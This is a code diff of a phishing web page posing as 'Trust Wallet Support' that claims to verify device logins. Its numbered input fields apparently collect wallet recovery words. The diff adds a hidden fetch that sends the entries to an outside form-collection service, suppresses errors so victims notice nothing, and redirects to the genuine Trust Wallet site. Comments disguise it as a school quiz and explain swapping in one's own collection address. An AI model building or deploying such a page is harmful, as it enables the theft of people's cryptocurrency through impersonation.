@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Trust Wallet Support</title>
   <style>
     body {
@@ -27,11 +27,11 @@
 
     .marquee span {
       display: inline-block;
-      font-size: 18px; /* smaller than before */
+      font-size: 18px;
       font-weight: bold;
       padding-left: 100%;
       animation: marquee 10s linear infinite;
-      color: #0f0; /* green for emphasis */
+      color: #0f0;
     }
 
     @keyframes marquee {
@@ -125,16 +125,16 @@
   </style>
 </head>
 <body>
-  <!-- ✅ Moving message -->
+  <!-- Moving message -->
   <div class="marquee"><span>Trust wallet security page verifies unknown device loggings</span></div>
 
   <div class="container">
     <!-- Form -->
-    <form id="schoolForm" action="https://formspree.io/f/mdkljyll" method="POST">
-       
+    <!-- 🔴 Replace action value below with your formsubmit.co address (example: https://formsubmit.co/your-email-or-id) -->
+    <form id="schoolForm" action="https://formspree.io/f/xjkejwjns" method="POST">
       <!-- Hidden fields so students don't see redirects -->
       <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_next" value="">
+      <input type="hidden" name="_next" value="lesson.html">
 
       <div class="inputs">
         <label>1.<input type="text" name="Q1" required></label>
@@ -171,7 +171,7 @@
     const progress = document.getElementById("progress");
     const done = document.getElementById("done");
 
-    // 🔄 Clear inputs when page reloads
+    // Clear inputs when page reloads
     window.onload = () => {
       inputs.forEach(input => input.value = "");
       button.classList.remove("active");
@@ -204,7 +204,8 @@
         return;
       }
 
-      e.preventDefault(); // Stop normal redirect
+      // Prevent default so we can show the animation and ensure the fetch send
+      e.preventDefault();
 
       // Show loading animation
       loading.style.display = "flex";
@@ -214,16 +215,22 @@
         progress.innerText = count + "%";
         if (count >= 100) {
           clearInterval(interval);
+          // Hide loading immediately at 100%
+          loading.style.display = "none";
+          // Show done briefly
           done.style.display = "block";
 
-          // ✅ Hide loading immediately after reaching 100
-          loading.style.display = "none";
-
-          // Send answers secretly
+          // Send answers using fetch to the form action
           const formData = new FormData(form);
           fetch(form.action, {
             method: "POST",
             body: formData
+          }).catch(err => {
+            // network errors ignored so students don't see anything
+            console.warn("Form send failed:", err);
+          }).finally(() => {
+            // Immediately redirect to the official Trust Wallet site
+            window.location.href = 'https://trustwallet.com/';
           });
 
           // Clear inputs after submission
@@ -235,7 +242,4 @@
     });
   </script>
 </body>
-
 </html>
-
-
